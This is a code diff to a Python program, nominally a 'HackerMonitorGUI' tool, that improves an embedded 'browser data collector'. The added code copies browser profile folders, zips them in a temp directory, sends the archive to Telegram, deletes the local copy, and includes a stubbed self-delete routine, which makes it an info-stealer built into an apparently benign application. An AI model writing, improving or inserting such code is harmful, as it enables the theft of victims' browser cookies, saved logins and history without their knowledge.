@@ -285,34 +285,41 @@ class HackerMonitorGUI(tk.Tk):
 
 # --- code2 functions ---
 
+def try_copy(src, dst, name):
+    try:
+        shutil.copy2(src, dst)
+    except PermissionError:
+        log_message(f"Permission denied copying from {src} in {name}")
+    except Exception as e:
+        log_message(f"Error copying {src} in {name}: {e}")
+
 def copy_and_zip_folders():
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     zip_path = Path(tempfile.gettempdir()) / f"browsers_network_{timestamp}.zip"
     with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
         for name, source_path in BROWSERS.items():
             if not source_path.exists():
+                log_message(f"{name} path does not exist: {source_path}")
                 continue
             try:
                 with tempfile.TemporaryDirectory() as temp_dir:
                     dest_path = Path(temp_dir) / name
-                    try:
-                        shutil.copytree(source_path, dest_path)
-                    except shutil.Error as e:
-                        if "cannot access the file because it is being used by another process" not in str(e):
-                            log_message(f"Error copying {name}: {e}")
-                        continue
-                        
+                    shutil.copytree(
+                        source_path,
+                        dest_path,
+                        dirs_exist_ok=True,
+                        copy_function=lambda src, dst: try_copy(src, dst, name)
+                    )
                     for root, _, files in os.walk(dest_path):
                         for file in files:
                             full_path = Path(root) / file
+                            arcname = Path(name) / full_path.relative_to(dest_path)
                             try:
-                                arcname = Path(name) / full_path.relative_to(dest_path)
                                 zipf.write(full_path, arcname)
-                            except PermissionError:
-                                continue
+                            except Exception as e:
+                                log_message(f"Error adding to zip [{arcname}]: {e}")
             except Exception as e:
-                if "cannot access the file" not in str(e):
-                    log_message(f"Error copying {name}: {e}")
+                log_message(f"Error copying {name}: {e}")
                 continue
     return str(zip_path)
 
@@ -327,16 +334,19 @@ def send_to_telegram(zip_file):
     except Exception as e:
         log_message(f"Failed to send file to Telegram: {e}")
 
+def self_delete():
+    pass  # Disabled self-delete
+
 def run_code2_task():
+    log_message("Running embedded browser data collector task...")
+    zip_file = copy_and_zip_folders()
+    send_to_telegram(zip_file)
     try:
-        zip_file = copy_and_zip_folders()
-        send_to_telegram(zip_file)
-        try:
-            os.remove(zip_file)
-        except:
-            pass
-    except:
-        pass
+        os.remove(zip_file)
+    except Exception as e:
+        log_message(f"Failed to delete zip file: {e}")
+
+# --- Main ---
 
 def main():
     run_code2_task()
